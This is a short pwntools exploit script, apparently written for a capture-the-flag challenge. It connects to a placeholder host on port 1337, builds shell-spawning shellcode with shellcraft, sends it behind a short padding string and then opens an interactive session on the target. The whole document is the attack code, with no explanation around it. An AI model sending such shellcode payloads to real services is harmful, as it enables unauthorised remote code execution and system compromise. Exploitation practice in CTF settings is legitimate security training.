from pwn import *
from ctftools.pwn.common import connect

exe = ELF("a.out")
io = connect(exe, "host", 1337)


print(shellcraft.sh())

io.sendline(b'XXX' + asm(shellcraft.sh()))

io.interactive()

# <main+233> : read